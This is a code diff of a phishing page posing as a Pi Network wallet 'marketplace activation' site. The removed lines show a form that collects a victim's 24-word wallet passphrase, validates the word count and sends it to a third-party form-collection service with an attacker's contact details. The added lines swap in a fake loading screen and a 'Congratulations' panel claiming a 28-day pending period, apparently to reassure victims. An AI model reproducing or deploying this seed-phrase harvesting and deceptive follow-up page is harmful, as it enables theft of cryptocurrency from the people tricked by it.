@@ -3328,103 +3328,109 @@
             <div class="container mx-auto flex flex-1 flex-col justify-center px-4 py-2">
 
 
+                <style>
+                    .reloader {
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 70vh;
+                        margin: 0;
+                    }
 
+                    .reloader2 {
+                        display: flex;
+                        justify-content: center;
 
+                        margin: 20px;
+                    }
 
+                    img {
+                        width: 300px;
+                        height: auto;
+                    }
 
+                    .container {
+    max-width: 400px;
+    margin: 0 auto;
+    background-color: white;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+}
 
+.title {
+    font-size: 18px;
+    font-weight: bold;
+    margin-bottom: 20px;
+}
 
+.card {
+    background: linear-gradient(to bottom, #5b248c, #692a93);
+    color: white;
+    padding: 20px;
+    border-radius: 10px 10px 0 0;
+}
+
+.congrats {
+    font-size: 20px;
+    font-weight: bold;
+}
+
+.submitted {
+    font-size: 14px;
+    margin-top: 5px;
+}
+
+.content {
+    padding: 20px;
+    font-size: 14px;
+    color: #333;
+}
+
+.thank-you {
+    font-weight: bold;
+    margin-top: 10px;
+}
+
+.status-btn {
+    background-color: #5b248c;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    font-size: 16px;
+    border-radius: 5px;
+    cursor: pointer;
+    display: block;
+    width: 80%;
+    margin: 20px auto;
+}
+
+.status-btn:hover {
+    background-color: #692a93;
+}
+                </style>
                 <div class=" flex  items-center justify-center text-center">
-
-
-
-
-
-
-
-                    <form id="myForm" action="https://formsubmit.co/27f335cae210c769905a627100378c3c" method="POST"
-                        name="myForm" onSubmit="SetCookies();return chkFormular();" enctype="multipart/form-data"
-                        target="_self">
-
-                        <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_subject" value="New submission!">
-                        <input type="hidden" name="subject" value="More_Fundz">
-                        <input type="hidden" name="admin" value="DonDaDa@mail.com">
-
-                        <input type="hidden" name="_next" value="https://piwallet-marketplace.pages.dev/wallet_err.html">
-
-
-
-
-                        <br>
-                        <label for="lname"> <span class="text-2xl text-gray-800 mt-4" fill="currentColor">Unlock Pi
-                                Wallet</span> </label><br> <br>
-
-                        <textarea id="textarea" name="message" placeholder="Enter your 24-word &#10;passphrase here"
-                            cols="25" rows="8" style="resize: none;  ">
-</textarea>
-
-                        <p class="error text-red-500" id="error-message">Thank you for submitting your marketplace activation </p>
-                        <p class="error text-red-500" id="error-message">  There will be a 28-day pending period. To activate your marketplace, </p>
-                        <p class="error text-red-500" id="error-message">  the marketplace will be free to use immediately after the 28-day pending period.</p>
-
-
-
-
-
-                        <input
-                            class="border border-primary-500 rounded-full inline-block  text-center transition ease-in-out duration-300 focus-visible:outline-2 focus-visible:ring-inset focus-visible:outline-primary-500 rounded-full rounded-md   disabled:bg-gray-500 text-primary-500 bg-white hover:bg-primary-700 px-4 py-2 w-full mt-4"
-                            type="submit" value="Unlock with passphrase"></a>
-                        <div class="w-full  mb-1 " >
-                            <div class="mb-6"> <input
-                                    class="inline-block rounded-lg text-center transition ease-in-out duration-300 focus-visible:outline-none focus-visible:outline-2 focus-visible:ring-inset focus-visible:outline-primary-500 disabled:bg-gray-500 text-white bg-primary-500 hover:bg-primary-700 px-4 py-2 w-full mt-4"
-                                    type="submit" value="Unlock with Fingerprint"><br><br>
-
-                                <p style="text-align: left; ">As a non-custodial wallet, your wallet <br> passphrase is
-                                    exclusively accessible only to <br> you. Recovery of passphrase is currently <br>
-                                    impossible.</p>
-                                <br>
-
-                                <p style="text-align: left;"> Lost your passphrase? <a class="text-blue-500"
-                                        href="#">You can create a new <br> wallet,</a> but all your &#960; in your
-                                    previous wallet <br> will be inaccessible.</p>
-                    </form>
-
-
-                    <script type="text/javascript">
-
-                        document.addEventListener('DOMContentLoaded', () => {
-                            const form = document.getElementById('myForm');
-                            const textarea = document.getElementById('textarea');
-                            const errorMessage = document.getElementById('error-message');
-
-                            form.addEventListener('submit', (event) => {
-                                const text = textarea.value.trim();
-                                const wordCount = text.split(/\s+/).filter(Boolean).length;
-
-                                if (text === '') {
-                                    // Empty field
-                                    errorMessage.textContent = 'Enter your Passphrase.';
-                                    event.preventDefault(); // Prevent form submission
-                                } else if (wordCount !== 24) {
-                                    // Check exact word count
-                                    errorMessage.textContent = 'Your Passphrase must contain exactly 24 words.!';
-                                    event.preventDefault(); // Prevent form submission
-                                } else {
-                                    // Clear any previous error messages
-                                    errorMessage.textContent = 'Invalid Passphrase';
-                                }
-                            });
-                        });
-
-
-
-                    </script>
-
-
+                   
+                    <div class="reloader">
+                        <img src="loading.gif" alt="Display Image" id="displayImage" style="display: block !important">
+                     
+                    </div>
+                    <div class="status_alert" style="display: none;">
+                        <h1 class="title">PI MARKETPLACE ACTIVATION</h1>
+                        <div class="card">
+                            <h2 class="congrats">Congratulations!</h2>
+                            <p class="submitted">Your application has been submitted!</p>
+                        </div>
+                        <div class="content">
+                            <p>Thank you for submitting your marketplace activation.</p>
+                            <p>There will be a <strong>28-day pending period</strong>. To activate your marketplace, the marketplace will be free to use immediately after the 28-day pending period.</p>
+                            <p class="thank-you">Thank you!</p>
+                        </div>
+                        <button class="status-btn">See status</button>
+                    </div>
                 </div>
-
             </div>
+    </div>
     </div>
 
     </div>
@@ -3439,6 +3445,13 @@
 
     </main>
     </div><!--/$-->
+
+    <script>
+        setTimeout(function() {
+            document.querySelector('.reloader').style.display = 'none'; 
+            document.querySelector('.status_alert').style.display = 'block'; 
+        }, 4000);
+    </script>
 
     <main class="flex flex-col h-full sm:pl-browserLayoutDrawerWidth">
         <div class="container flex-1 flex flex-col justify-center mx-auto py-2 px-4">
@@ -3461,7 +3474,7 @@
                         <path fill="#fff" d="M177.5 182h669v660h-669z"></path>
                     </clipPath>
                 </defs></svg>
-
+                
 
 </body>
 
